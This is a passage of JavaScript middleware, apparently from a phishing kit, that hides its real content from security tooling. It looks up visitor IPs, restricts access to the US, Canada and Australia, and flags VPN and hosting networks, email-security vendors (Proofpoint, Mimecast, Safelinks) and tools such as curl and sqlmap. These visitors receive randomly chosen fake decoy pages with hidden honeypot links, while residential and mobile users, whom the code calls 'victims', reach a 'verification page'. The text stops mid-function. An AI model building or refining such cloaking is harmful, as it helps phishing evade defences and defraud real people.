// middleware/botDetection.js
const { getFingerprint, decrypt } = require('../utils/encryption');
const { getVictimInfo } = require('../utils/helpers');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');

// File paths for persistent storage
const DATA_DIR = './data';
const BLOCKED_IPS_FILE = path.join(DATA_DIR, 'blocked_ips.txt');
const BOT_MESSAGES_FILE = path.join(DATA_DIR, 'bot_messages.json');
const PAGE_ACCESS_MESSAGES_FILE = path.join(DATA_DIR, 'page_access_messages.json');
const BOT_DETECTIONS_LOG = path.join(DATA_DIR, 'bot_detections.log');
const TOKENS_FILE = path.join(DATA_DIR, 'verification_tokens.json');

// Token storage
let tokenStore = new Map();

// IP Intelligence Cache
const ipIntelCache = new Map();

// Token configuration
const TOKEN_CONFIG = {
    TOKEN_EXPIRY_MS: 24 * 60 * 60 * 1000,
    MIN_MOUSE_MOVEMENTS: 10,
    MAX_VERIFICATION_TIME_MS: 60000,
    MIN_VERIFICATION_TIME_MS: 300
};

// Allowed countries (USA, Canada, Australia)
const ALLOWED_COUNTRIES = ['US', 'CA', 'AU'];

// Known hosting ASNs (ip-api.com sometimes misclassifies these)
const HOSTING_ASNS = [
    '48090', '9009', '7203', '13335', '16509', '14618',
    '16276', '14061', '24940', '20473', '45102', '31898',
    '62567', '141039', '200313', '206092', '393398'
];

// Known VPN/Proxy organizations
const VPN_ORGS = [
    'nordvpn', 'expressvpn', 'cyberghost', 'privateinternetaccess',
    'pia', 'protonvpn', 'hide.me', 'vyprvpn', 'ipvanish', 'torguard',
    'packethub', 'm247', 'leaseweb', 'digitalocean', 'ovh', 'hetzner'
];

// Load tokens
function loadTokens() {
    try {
        if (fs.existsSync(TOKENS_FILE)) {
            const data = fs.readFileSync(TOKENS_FILE, 'utf8');
            const parsed = JSON.parse(data);
            tokenStore = new Map(parsed);
            
            for (const [token, value] of tokenStore.entries()) {
                if (value.expiresAt && typeof value.expiresAt === 'string') {
                    value.expiresAt = parseInt(value.expiresAt);
                }
                if (value.created && typeof value.created === 'string') {
                    value.created = parseInt(value.created);
                }
            }
            
            console.log(`📂 Loaded ${tokenStore.size} verification tokens`);
            
            const now = Date.now();
            let expiredCount = 0;
            for (const [token, data] of tokenStore.entries()) {
                if (now > data.expiresAt) {
                    tokenStore.delete(token);
                    expiredCount++;
                }
            }
            if (expiredCount > 0) {
                console.log(`🗑️ Removed ${expiredCount} expired tokens`);
                saveTokens();
            }
        }
    } catch (err) {
        console.error('Error loading tokens:', err);
    }
}

function saveTokens() {
    try {
        const data = JSON.stringify(Array.from(tokenStore.entries()));
        fs.writeFileSync(TOKENS_FILE, data, 'utf8');
    } catch (err) {
        console.error('Error saving tokens:', err);
    }
}

setInterval(() => saveTokens(), 60000);

// ============ IP INTELLIGENCE WITH COUNTRY CHECK ============
async function getIPInfo(ip) {
    // Check cache
    if (ipIntelCache.has(ip)) {
        const cached = ipIntelCache.get(ip);
        console.log(`📋 IP Cache hit: ${ip} -> ${cached.userType}`);
        return cached;
    }
    
    // Skip private/local IPs
    if (ip === '127.0.0.1' || ip === '::1' || ip === 'localhost' || 
        ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.')) {
        const localInfo = { 
            userType: 'local', 
            isp: 'Local', 
            org: 'Local',
            asn: 'Local',
            asname: 'Local',
            countryCode: 'US',
            isMobile: false, 
            isProxy: false, 
            isHosting: false 
        };
        ipIntelCache.set(ip, localInfo);
        return localInfo;
    }
    
    try {
        // Query ip-api.com for IP intelligence (added countryCode)
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,isp,org,as,asname,mobile,proxy,hosting,countryCode`, {
            timeout: 3000
        });
        
        if (response.data.status === 'success') {
            const data = response.data;
            const countryCode = data.countryCode || 'Unknown';
            
            // Extract ASN number
            const asn = data.as || '';
            const asnNumber = asn.split(' ')[0].replace('AS', '');
            const orgLower = (data.org || '').toLowerCase();
            const ispLower = (data.isp || '').toLowerCase();
            
            // ============ ASN-BASED CORRECTIONS ============
            if (HOSTING_ASNS.includes(asnNumber)) {
                console.log(`🎭 ASN OVERRIDE: ${asnNumber} is hosting - forcing hosting=true`);
                data.hosting = true;
                data.proxy = true;
            }
            
            if (VPN_ORGS.some(vpn => orgLower.includes(vpn) || ispLower.includes(vpn))) {
                console.log(`🎭 VPN OVERRIDE: ${data.org} - forcing proxy=true`);
                data.proxy = true;
            }
            
            if (ispLower.includes('unmanaged') || orgLower.includes('unmanaged')) {
                console.log(`🎭 UNMANAGED LTD OVERRIDE: Hosting provider detected`);
                data.hosting = true;
                data.proxy = true;
            }
            
            if (ispLower.includes('m247') || orgLower.includes('m247')) {
                console.log(`🎭 M247 OVERRIDE: Hosting/proxy provider detected`);
                data.hosting = true;
                data.proxy = true;
            }
            // ===============================================
            
            // ============ CLASSIFICATION LOGIC ============
            let userType = 'residential';
            let isRealUser = false;
            
            // Check country first
            const isCountryAllowed = ALLOWED_COUNTRIES.includes(countryCode);
            
            if (!isCountryAllowed) {
                userType = 'blocked_country';
                isRealUser = false;
                console.log(`🌍 COUNTRY BLOCKED: ${ip} (${countryCode}) - Not allowed`);
            } else if (data.mobile === true) {
                userType = 'cellular';
                isRealUser = true;
                console.log(`📱 MOBILE DETECTED: ${ip} (${data.isp}) - REAL USER`);
            } else if (data.proxy === true || data.hosting === true) {
                userType = 'hosting';
                isRealUser = false;
                console.log(`🎭 SCANNER DETECTED: ${ip} (${data.isp}) - mobile=${data.mobile}, proxy=${data.proxy}, hosting=${data.hosting}`);
            } else {
                userType = 'residential';
                isRealUser = true;
                console.log(`✅ RESIDENTIAL: ${ip} (${data.isp}) - REAL USER`);
            }
            // ==============================================
            
            const info = {
                userType: userType,
                isRealUser: isRealUser,
                countryCode: countryCode,
                isp: data.isp || 'Unknown',
                org: data.org || 'Unknown',
                asn: data.as || 'Unknown',
                asnNumber: asnNumber,
                asname: data.asname || 'Unknown',
                isMobile: data.mobile === true,
                isProxy: data.proxy === true,
                isHosting: data.hosting === true
            };
            
            console.log(`📍 IP Info for ${ip}: userType=${userType}, country=${countryCode}, mobile=${data.mobile}, proxy=${data.proxy}, hosting=${data.hosting}, ASN=${asnNumber}`);
            
            ipIntelCache.set(ip, info);
            setTimeout(() => ipIntelCache.delete(ip), 24 * 60 * 60 * 1000);
            
            return info;
        } else {
            console.log(`⚠️ IP API error for ${ip}: ${response.data.message}`);
        }
    } catch (error) {
        console.log(`⚠️ IP intelligence failed for ${ip}: ${error.message}`);
    }
    
    const fallbackInfo = { 
        userType: 'residential', 
        isRealUser: true,
        countryCode: 'Unknown',
        isp: 'Unknown', 
        org: 'Unknown',
        asn: 'Unknown',
        asnNumber: '',
        asname: 'Unknown',
        isMobile: false, 
        isProxy: false, 
        isHosting: false 
    };
    ipIntelCache.set(ip, fallbackInfo);
    return fallbackInfo;
}
// ============================================================

// Scanner detection
async function isEmailScanner(userAgent, ip, headers, requestStartTime, requestUrl) {
    const ua = userAgent.toLowerCase();
    const allHeaders = Object.keys(headers).join(' ').toLowerCase();
    
    const ipInfo = await getIPInfo(ip);
    
    // Log the URL being accessed
    console.log(`🌐 URL ACCESS: ${requestUrl} | IP: ${ip} | Country: ${ipInfo.countryCode}`);
    
    // Country block check
    if (!ALLOWED_COUNTRIES.includes(ipInfo.countryCode)) {
        console.log(`🌍 COUNTRY BLOCKED: ${ip} (${ipInfo.countryCode}) - Access denied`);
        return true;
    }
    
    if (ipInfo.userType === 'cellular') {
        console.log(`✅ CELLULAR USER: ${ip} (${ipInfo.isp}) - Sending to verification page`);
        return false;
    }
    
    if (ipInfo.userType === 'proxy' || ipInfo.userType === 'hosting') {
        console.log(`🎭 SCANNER/VPN DETECTED: ${ip} (${ipInfo.isp}) - Serving decoy page`);
        return true;
    }
    
    if (ipInfo.userType === 'residential') {
        console.log(`✅ RESIDENTIAL USER: ${ip} (${ipInfo.isp}) - Sending to verification page`);
    }
    
    const obviousBots = [
        'headless', 'puppeteer', 'selenium', 'phantomjs',
        'python-requests', 'curl', 'wget', 'go-http-client',
        'axios', 'node-fetch', 'scrapy', 'nmap', 'nikto', 'sqlmap'
    ];
    
    for (const bot of obviousBots) {
        if (ua.includes(bot)) {
            console.log(`🎭 Obvious bot UA detected: ${bot} - Serving decoy page`);
            return true;
        }
    }
    
    const emailVendors = [
        'proofpoint', 'mimecast', 'barracuda', 'microsoft.atp',
        'microsoft-defender', 'safelinks', 'exchange online',
        'google.postmaster', 'trend.micro', 'sophos', 'fortinet',
        'cisco.esa', 'mcafee', 'symantec', 'kaspersky'
    ];
    
    for (const vendor of emailVendors) {
        if (ua.includes(vendor) || allHeaders.includes(vendor)) {
            console.log(`🎭 Email vendor detected: ${vendor} - Serving decoy page`);
            return true;
        }
    }
    
    console.log(`✅ Not a scanner - sending to verification page`);
    return false;
}

// ============ STATIC DECOY PAGE FOR ALL SCANNERS/BLOCKED IPS ============
function serveDecoyPage(res, botType, ip, ipInfo = null) {
    const ispName = ipInfo?.isp || 'Unknown';
    console.log(`🎭 Serving decoy page to ${botType} from IP: ${ip} (${ispName})`);
    
    // Randomly select one of 100 decoy pages
    const decoyNumber = Math.floor(Math.random() * 100) + 1;
    const pageContent = getDecoyPage(decoyNumber);
    
    res.send(pageContent);
}

function getDecoyPage(pageNumber) {
    const pages = {
        // Pages 1-10: Original tech blog + variations
        1: generateTechBlogPage(),
        2: generateEcommercePage(),
        3: generateCorporatePage(),
        4: generatePortfolioPage(),
        5: generateDocsPage(),
        6: generateJobBoardPage(),
        7: generateForumPage(),
        8: generateNewsPage(),
        9: generateLearningPage(),
        10: generateSaaSPage(),
        
        // Pages 11-20: Lifestyle & Hobbies
        11: generateRecipeBlogPage(),
        12: generateTravelBlogPage(),
        13: generateFitnessPage(),
        14: generateRealEstatePage(),
        15: generateMusicPage(),
        16: generateGamingPage(),
        17: generateFinancePage(),
        18: generateHealthcarePage(),
        19: generateEducationPage(),
        20: generateLegalPage(),
        
        // Pages 21-30: Tech Specialties
        21: generateNonprofitPage(),
        22: generateAIBlogPage(),
        23: generateDevOpsPage(),
        24: generateCybersecurityPage(),
        25: generateDataSciencePage(),
        26: generateMobileDevPage(),
        27: generateCloudComputingPage(),
        28: generateBlockchainPage(),
        29: generateIoTPage(),
        30: generateARVRPage(),
        
        // Pages 31-40: Business & Creative
        31: generateStartupPage(),
        32: generateMarketingPage(),
        33: generateDesignPage(),
        34: generatePhotographyPage(),
        35: generateCookingPage(),
        36: generateGardeningPage(),
        37: generatePetCarePage(),
        38: generateParentingPage(),
        39: generateDIYPage(),
        40: generateAutoPage(),
        
        // Pages 41-50: Academic & Self-Improvement
        41: generateSciencePage(),
        42: generateHistoryPage(),
        43: generatePhilosophyPage(),
        44: generatePsychologyPage(),
        45: generateBusinessPage(),
        46: generateLeadershipPage(),
        47: generateProductivityPage(),
        48: generateMinimalistPage(),
        49: generateSustainabilityPage(),
        50: generateRemoteWorkPage(),
        
        // Pages 51-60: Enterprise & Infrastructure
        51: generateCryptoExchangePage(),
        52: generateSocialMediaPage(),
        53: generateWikiPage(),
        54: generateSupportPortalPage(),
        55: generateBugTrackerPage(),
        56: generateCodeRepoPage(),
        57: generateDockerRegistryPage(),
        58: generateK8sDashboardPage(),
        59: generateDatabaseAdminPage(),
        60: generateRedisInsightPage(),
        
        // Pages 61-70: Middleware & Servers
        61: generateRabbitMQPage(),
        62: generateNginxStatusPage(),
        63: generateApachePage(),
        64: generateTomcatPage(),
        65: generateJenkinsPage(),
        66: generateGitLabPage(),
        67: generateJiraPage(),
        68: generateConfluencePage(),
        69: generateWordPressPage(),
        70: generateDrupalPage(),
        
        // Pages 71-80: E-commerce & CRM
        71: generateMagentoPage(),
        72: generateShopifyPage(),
        73: generateSalesforcePage(),
        74: generateHubSpotPage(),
        75: generateZendeskPage(),
        76: generateSlackArchivePage(),
        77: generateTeamsArchivePage(),
        78: generateGSuitePage(),
        79: generateOffice365Page(),
        80: generateSharePointPage(),
        
        // Pages 81-90: Cloud Storage & Collaboration
        81: generateOneDrivePage(),
        82: generateDropboxPage(),
        83: generateBoxPage(),
        84: generateNotionPage(),
        85: generateTrelloPage(),
        86: generateAsanaPage(),
        87: generateMondayPage(),
        88: generateClickUpPage(),
        89: generateFigmaPage(),
        90: generateAdobePage(),
        
        // Pages 91-100: Development & Analytics
        91: generateUnityPage(),
        92: generateUnrealPage(),
        93: generateBlenderPage(),
        94: generateAutodeskPage(),
        95: generateMatlabPage(),
        96: generateTableauPage(),
        97: generatePowerBIPage(),
        98: generateSnowflakePage(),
        99: generateDatabricksPage(),
        100: generateAirflowPage()
    };
    
    return pages[pageNumber] || pages[1];
}

function getHoneypotLinks() {
    const links = [
        '/honeypot/admin', '/honeypot/config', '/honeypot/api/keys',
        '/honeypot/.env', '/honeypot/backup', '/honeypot/database',
        '/honeypot/phpmyadmin', '/honeypot/wp-admin', '/honeypot/backup.zip',
        '/honeypot/credentials', '/honeypot/secrets', '/honeypot/aws-keys',
        '/honeypot/ssh-keys', '/honeypot/passwords', '/honeypot/config.yml'
    ];
    
    return `<div style="display:none">
        ${links.map(link => `<a href="${link}" rel="nofollow">${link.split('/').pop()}</a>`).join('')}
    </div>`;
}

// ============ PAGES 1-10 ============

function generateTechBlogPage() {
    return `<!DOCTYPE html>
    <html>
    <head>
        <title>Modern Web Development Blog</title>
        <meta name="robots" content="noindex, nofollow">
        <meta charset="UTF-8">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;line-height:1.6;color:#1a1a1a;max-width:1000px;margin:0 auto;padding:40px 20px;background:#fafafa}
            .blog-post{background:white;padding:40px;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,0.05)}
            h1{color:#1a1a1a;font-size:36px;margin-bottom:20px;font-weight:700}
            .meta{color:#666;font-size:14px;margin-bottom:30px;padding-bottom:20px;border-bottom:2px solid #f0f0f0}
            h2{color:#2c3e50;margin:30px 0 15px;font-size:24px;font-weight:600}
            .code-block{background:#1e1e1e;color:#d4d4d4;padding:20px;border-radius:8px;margin:20px 0;font-family:'Courier New',monospace;font-size:14px;overflow-x:auto}
            .tip{background:#e8f4fd;border-radius:8px;padding:16px;margin:20px 0;border-left:4px solid #007acc}
            .footer{margin-top:40px;padding-top:20px;border-top:1px solid #eee;font-size:13px;color:#999;text-align:center}
        </style>
    </head>
    <body>
        <div class="blog-post">
            <h1>Building Scalable Web Applications in 2026</h1>
            <div class="meta">
                <span>📅 April 12, 2026</span>
                <span>👤 Sarah Chen, Senior Developer</span>
                <span>⏱ 8 min read</span>
            </div>
            <div class="content">
                <p>In the rapidly evolving landscape of web development, building scalable applications requires a thoughtful approach to architecture, tooling, and deployment strategies.</p>
                <h2>Modern Frontend Architecture</h2>
                <p>The frontend ecosystem has matured significantly, with component-based architectures becoming the standard.</p>
                <div class="code-block"><code>// React component example\nfunction App() {\n  const [data, setData] = useState(null);\n  useEffect(() => {\n    fetchData().then(setData);\n  }, []);\n  return <div>{data}</div>;\n}</code></div>
                <div class="tip"><strong>💡 Pro Tip:</strong> Always use TypeScript for better type safety and developer experience.</div>
            </div>
            ${getHoneypotLinks()}
        </div>
    </body>
    </html>`;
}

function generateEcommercePage() {
    return `<!DOCTYPE html>
    <html>
    <head>
        <title>Premium Electronics Store</title>
        <meta name="robots" content="noindex, nofollow">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:Arial,sans-serif;background:#f5f5f5}
            .product{max-width:1200px;margin:0 auto;padding:20px;background:white}
            .product-image{float:left;width:40%;margin-right:40px}
            .product-details{float:left;width:50%}
            .price{color:#b12704;font-size:28px;margin:15px 0}
            .button{background:#ff9900;padding:12px 30px;border:none;border-radius:8px;cursor:pointer}
            @media(max-width:768px){.product-image,.product-details{width:100%}}
        </style>
    </head>
    <body>
        <div class="product">
            <div class="product-image">
                <img src="/images/product.jpg" alt="Product" style="width:100%;background:#eee;height:300px;object-fit:cover">
            </div>
            <div class="product-details">
                <h1>UltraBook Pro X1</h1>
                <div class="price">$1,299.00</div>
                <p>Latest generation laptop with 16GB RAM, 512GB SSD, and 14-inch 4K display. Perfect for professionals and creators.</p>
                <ul><li>Intel Core i7-13800H</li><li>16GB LPDDR5 RAM</li><li>512GB NVMe SSD</li><li>14" 4K OLED Display</li></ul>
                <button class="button">Add to Cart</button>
            </div>
        </div>
        ${getHoneypotLinks()}
    </body>
    </html>`;
}

function generateCorporatePage() {
    return `<!DOCTYPE html>
    <html>
    <head>
        <title>NexGen Solutions | Enterprise Technology</title>
        <meta name="robots" content="noindex, nofollow">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:'Segoe UI',sans-serif}
            header{background:#0a2540;color:white;padding:20px}
            .hero{background:linear-gradient(135deg,#0a2540,#2c5f8a);color:white;padding:80px 20px;text-align:center}
            .services{display:grid;grid-template-columns:repeat(3,1fr);gap:30px;padding:60px 20px;max-width:1200px;margin:0 auto}
            .card{background:#f8f9fa;padding:30px;border-radius:8px}
            footer{background:#0a2540;color:white;text-align:center;padding:30px}
        </style>
    </head>
    <body>
        <header><h2>NexGen Solutions</h2></header>
        <div class="hero"><h1>Transforming Business Through Technology</h1><p>Innovative solutions for the modern enterprise</p></div>
        <div class="services">
            <div class="card"><h3>Cloud Services</h3><p>AWS, Azure, GCP expertise</p></div>
            <div class="card"><h3>AI & ML</h3><p>Cutting-edge artificial intelligence</p></div>
            <div class="card"><h3>Cybersecurity</h3><p>Enterprise-grade protection</p></div>
        </div>
        <footer><p>© 2026 NexGen Solutions. All rights reserved.</p></footer>
        ${getHoneypotLinks()}
    </body>
    </html>`;
}

function generatePortfolioPage() {
    return `<!DOCTYPE html>
    <html>
    <head>
        <title>Creative Portfolio | Jane Smith</title>
        <meta name="robots" content="noindex, nofollow">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:Georgia,serif;background:#1a1a1a;color:#fff}
            .gallery{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px;padding:40px}
            .work-item{background:#2a2a2a;padding:20px;border-radius:4px}
            h1{text-align:center;padding:40px 0 20px}
        </style>
    </head>
    <body>
        <h1>Selected Works</h1>
        <div class="gallery">
            ${[1,2,3,4,5,6].map(i => `<div class="work-item"><h3>Project ${i}</h3><p>Branding • Web Design • Photography</p></div>`).join('')}
        </div>
        ${getHoneypotLinks()}
    </body>
    </html>`;
}

function generateDocsPage() {
    return `<!DOCTYPE html>
    <html>
    <head>
        <title>API Documentation</title>
        <meta name="robots" content="noindex, nofollow">
        <style>
            body{font-family:monospace;max-width:900px;margin:0 auto;padding:20px}
            .endpoint{background:#f4f4f4;padding:15px;margin:10px 0;border-left:4px solid #007acc}
            code{background:#e0e0e0;padding:2px 5px}
        </style>
    </head>
    <body>
        <h1>REST API v2.0 Documentation</h1>
        <div class="endpoint"><strong>GET /api/users</strong><br>Returns list of users<br><code>curl -X GET https://api.example.com/users</code></div>
        <div class="endpoint"><strong>POST /api/auth</strong><br>Authenticate user<br><code>curl -X POST -d '{"email":"user@example.com"}' /api/auth</code></div>
        <div class="endpoint"><strong>GET /api/keys</strong><br>Retrieve API keys (admin only)</div>
        ${getHoneypotLinks()}
    </body>
    </html>`;
}

function generateJobBoardPage() {
    return `<!DOCTYPE html>
    <html>
    <head><title>TechJobs | Find Your Dream Role</title>
    <style>body{font-family:sans-serif;padding:20px;max-width:800px;margin:0 auto}.job{border-bottom:1px solid #ddd;padding:15px 0}</style>
    </head>
    <body><h1>Latest Tech Jobs</h1>
    <div class="job"><h3>Senior React Developer</h3><p>Remote • $150k-180k</p></div>
    <div class="job"><h3>DevOps Engineer</h3><p>New York • $140k-170k</p></div>
    <div class="job"><h3>Product Manager</h3><p>San Francisco • $160k-200k</p></div>
    ${getHoneypotLinks()}
    </body></html>`;
}

function generateForumPage() {
    return `<!DOCTYPE html>
    <html>
    <head><title>Developer Forum</title>
    <style>body{font-family:sans-serif;background:#f0f0f0}.post{background:white;margin:20px;padding:20px;border-radius:8px}</style>
    </head>
    <body><h1 style="padding:20px">Community Discussion</h1>
    <div class="post"><strong>@john_doe:</strong> Has anyone tried the new React 19 features?<div class="replies" style="margin-top:10px;color:#666">12 replies • Last 2 hours ago</div></div>
    <div class="post"><strong>@tech_guru:</strong> Best practices for Docker in production?<div class="replies" style="margin-top:10px;color:#666">8 replies • Last 5 hours ago</div></div>
    ${getHoneypotLinks()}
    </body></html>`;
}

function generateNewsPage() {
    return `<!DOCTYPE html>
    <html>
    <head><title>Daily Tech News</title>
    <style>body{font-family:Georgia,serif;max-width:800px;margin:0 auto;padding:20px}.headline{border-bottom:1px solid #ccc;padding:15px 0}</style>
    </head>
    <body><h1>TechCrunch Daily</h1>
    <div class="headline"><h2>AI Revolution Continues</h2><p>New models achieve breakthrough performance...</p><span>2 hours ago</span></div>
    <div class="headline"><h2>Cybersecurity Alert</h2><p>Major vulnerability patched in popular framework...</p><span>5 hours ago</span></div>
    ${getHoneypotLinks()}
    </body></html>`;
}

function generateLearningPage() {
    return `<!DOCTYPE html>
    <html>
    <head><title>CodeMaster Pro - Learn to Code</title>
    <style>.course{background:#f9f9f9;margin:20px;padding:20px;border-radius:8px}.progress{background:#4caf50;height:10px;width:60%}</style>
    </head>
    <body><h1 style="padding:20px">Your Learning Dashboard</h1>
    <div class="course"><h3>JavaScript Fundamentals</h3><div class="progress"></div><p>60% complete</p></div>
    <div class="course"><h3>React Mastery</h3><div class="progress" style="width:30%"></div><p>30% complete</p></div>
    ${getHoneypotLinks()}
    </body></html>`;
}

function generateSaaSPage() {
    return `<!DOCTYPE html>
    <html>
    <head><title>Analytics Dashboard</title>
    <style>body{background:#1e1e2f;color:white;font-family:monospace}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;padding:40px}.card{background:#2a2a3f;padding:30px;border-radius:12px;text-align:center}</style>
    </head>
    <body><div class="stats"><div class="card"><h2>1,234</h2><p>Active Users</p></div><div class="card"><h2>$45.2K</h2><p>Revenue (MTD)</p></div><div class="card"><h2>99.9%</h2><p>Uptime</p></div></div>
    ${getHoneypotLinks()}
    </body></html>`;
}

// ============ PAGES 11-20 ============

function generateRecipeBlogPage() {
    return `<!DOCTYPE html><html><head><title>Delicious Recipes</title><style>.recipe{max-width:800px;margin:0 auto;padding:20px}</style></head><body><div class="recipe"><h1>Homemade Sourdough Bread</h1><p>A step-by-step guide to perfect artisan bread.</p><ul><li>500g flour</li><li>350g water</li><li>100g starter</li><li>10g salt</li></ul></div>${getHoneypotLinks()}</body></html>`;
}

function generateTravelBlogPage() {
    return `<!DOCTYPE html><html><head><title>Wanderlust Adventures</title></head><body><h1>Exploring the Amalfi Coast</h1><p>Hidden gems and local favorites in southern Italy.</p><div>Read more about our journey through Positano, Amalfi, and Ravello.</div>${getHoneypotLinks()}</body></html>`;
}

function generateFitnessPage() {
    return `<!DOCTYPE html><html><head><title>FitLife Gym</title><style>.workout{background:#f0f0f0;padding:20px;margin:10px}</style></head><body><h1>30-Day Fitness Challenge</h1><div class="workout"><h3>Day 1: Full Body HIIT</h3><p>30 seconds work, 15 seconds rest</p></div>${getHoneypotLinks()}</body></html>`;
}

function generateRealEstatePage() {
    return `<!DOCTYPE html><html><head><title>Luxury Properties</title></head><body><h1>Featured Listings</h1><div><h3>Modern Villa with Ocean View</h3><p>$2,450,000 • 4 bed • 3.5 bath</p></div>${getHoneypotLinks()}</body></html>`;
}

function generateMusicPage() {
    return `<!DOCTYPE html><html><head><title>Indie Music Blog</title></head><body><h1>Album Reviews 2026</h1><div><h3>The Luminous Echo</h3><p>★★★★☆ • A haunting blend of electronic and acoustic</p></div>${getHoneypotLinks()}</body></html>`;
}

function generateGamingPage() {
    return `<!DOCTYPE html><html><head><title>Game Reviews Daily</title></head><body><h1>Latest Game Releases</h1><div><h3>Stellar Odyssey</h3><p>9/10 - "A space epic for the ages"</p></div>${getHoneypotLinks()}</body></html>`;
}

function generateFinancePage() {
    return `<!DOCTYPE html><html><head><title>Market Insights</title><style>.stock{color:green}</style></head><body><h1>Stock Market Today</h1><div class="stock">AAPL: $187.32 ▲ +2.4%</div><div>MSFT: $415.12 ▲ +1.8%</div>${getHoneypotLinks()}</body></html>`;
}

function generateHealthcarePage() {
    return `<!DOCTYPE html><html><head><title>Wellness Medical Center</title></head><body><h1>Patient Portal</h1><p>Schedule appointments, view records, and message your doctor.</p>${getHoneypotLinks()}</body></html>`;
}

function generateEducationPage() {
    return `<!DOCTYPE html><html><head><title>Global University</title></head><body><h1>Course Catalog 2026</h1><ul><li>CS101: Introduction to Programming</li><li>BUS202: Business Analytics</li></ul>${getHoneypotLinks()}</body></html>`;
}

function generateLegalPage() {
    return `<!DOCTYPE html><html><head><title>Smith & Associates Law</title></head><body><h1>Legal Resources</h1><p>Access case files, client portal, and document management.</p>${getHoneypotLinks()}</body></html>`;
}

// ============ PAGES 21-30 ============

function generateNonprofitPage() {
    return `<!DOCTYPE html><html><head><title>Ocean Conservation Fund</title></head><body><h1>Protecting Our Oceans</h1><p>Join us in preserving marine ecosystems for future generations.</p>${getHoneypotLinks()}</body></html>`;
}

function generateAIBlogPage() {
    return `<!DOCTYPE html><html><head><title>AI Weekly</title></head><body><h1>The State of LLMs in 2026</h1><p>Exploring the latest advances in artificial intelligence and machine learning.</p>${getHoneypotLinks()}</body></html>`;
}

function generateDevOpsPage() {
    return `<!DOCTYPE html><html><head><title>DevOps Pipeline</title><style>.status{color:green}</style></head><body><h1>CI/CD Dashboard</h1><div class="status">✅ Last build: SUCCESS</div><div>Deployment: Production • v2.3.1</div>${getHoneypotLinks()}</body></html>`;
}

function generateCybersecurityPage() {
    return `<!DOCTYPE html><html><head><title>Security Audit Log</title></head><body><h1>System Security Dashboard</h1><p>Monitoring threats, vulnerabilities, and access patterns.</p>${getHoneypotLinks()}</body></html>`;
}

function generateDataSciencePage() {
    return `<!DOCTYPE html><html><head><title>Data Analytics Platform</title></head><body><h1>Jupyter Notebook Server</h1><p>Interactive data analysis and visualization environment.</p>${getHoneypotLinks()}</body></html>`;
}

function generateMobileDevPage() {
    return `<!DOCTYPE html><html><head><title>Mobile Dev Blog</title></head><body><h1>iOS vs Android Development in 2026</h1><p>Comparing SwiftUI and Jetpack Compose for modern app development.</p>${getHoneypotLinks()}</body></html>`;
}

function generateCloudComputingPage() {
    return `<!DOCTYPE html><html><head><title>Cloud Console</title></head><body><h1>AWS Management Dashboard</h1><p>EC2: 12 instances running • S3: 345GB used</p>${getHoneypotLinks()}</body></html>`;
}

function generateBlockchainPage() {
    return `<!DOCTYPE html><html><head><title>Web3 Hub</title></head><body><h1>Decentralized Applications</h1><p>Connect wallet to interact with smart contracts.</p>${getHoneypotLinks()}</body></html>`;
}

function generateIoTPage() {
    return `<!DOCTYPE html><html><head><title>Smart Home Control</title></head><body><h1>Device Dashboard</h1><p>Temperature: 72°F • Lights: 4/6 on • Security: Armed</p>${getHoneypotLinks()}</body></html>`;
}

function generateARVRPage() {
    return `<!DOCTYPE html><html><head><title>Virtual Reality Experience</title></head><body><h1>Immersive Worlds</h1><p>Explore the latest in augmented and virtual reality technology.</p>${getHoneypotLinks()}</body></html>`;
}

// ============ PAGES 31-40 ============

function generateStartupPage() {
    return `<!DOCTYPE html><html><head><title>Startup Accelerator</title></head><body><h1>Founder Resources</h1><p>Pitch deck templates, investor database, and fundraising guides.</p>${getHoneypotLinks()}</body></html>`;
}

function generateMarketingPage() {
    return `<!DOCTYPE html><html><head><title>Digital Marketing Suite</title></head><body><h1>Campaign Analytics</h1><p>CTR: 3.2% • Conversions: 847 • ROI: 284%</p>${getHoneypotLinks()}</body></html>`;
}

function generateDesignPage() {
    return `<!DOCTYPE html><html><head><title>Design System Library</title></head><body><h1>UI Component Repository</h1><p>Buttons, forms, modals, and typography guidelines.</p>${getHoneypotLinks()}</body></html>`;
}

function generatePhotographyPage() {
    return `<!DOCTYPE html><html><head><title>Photography Portfolio</title></head><body><h1>Nature Through the Lens</h1><p>Landscape and wildlife photography from around the world.</p>${getHoneypotLinks()}</body></html>`;
}

function generateCookingPage() {
    return `<!DOCTYPE html><html><head><title>Quick & Easy Meals</title></head><body><h1>15-Minute Dinner Recipes</h1><p>Delicious meals for busy weeknights.</p>${getHoneypotLinks()}</body></html>`;
}

function generateGardeningPage() {
    return `<!DOCTYPE html><html><head><title>Urban Gardening Guide</title></head><body><h1>Growing Vegetables in Small Spaces</h1><p>Tips for container gardening and balcony farms.</p>${getHoneypotLinks()}</body></html>`;
}

function generatePetCarePage() {
    return `<!DOCTYPE html><html><head><title>Happy Paws Pet Care</title></head><body><h1>Pet Health & Wellness</h1><p>Nutrition, exercise, and veterinary tips.</p>${getHoneypotLinks()}</body></html>`;
}

function generateParentingPage() {
    return `<!DOCTYPE html><html><head><title>Parenting Today</title></head><body><h1>Raising Resilient Kids</h1><p>Advice for modern parents navigating technology and education.</p>${getHoneypotLinks()}</body></html>`;
}

function generateDIYPage() {
    return `<!DOCTYPE html><html><head><title>DIY Project Hub</title></head><body><h1>Home Improvement Tutorials</h1><p>Step-by-step guides for weekend projects.</p>${getHoneypotLinks()}</body></html>`;
}

function generateAutoPage() {
    return `<!DOCTYPE html><html><head><title>Auto Repair Blog</title></head><body><h1>Car Maintenance 101</h1><p>Oil changes, brake pads, and troubleshooting guides.</p>${getHoneypotLinks()}</body></html>`;
}

// ============ PAGES 41-50 ============

function generateSciencePage() {
    return `<!DOCTYPE html><html><head><title>Science Daily</title></head><body><h1>New Exoplanet Discovered</h1><p>NASA's Webb telescope finds Earth-like planet in habitable zone.</p>${getHoneypotLinks()}</body></html>`;
}

function generateHistoryPage() {
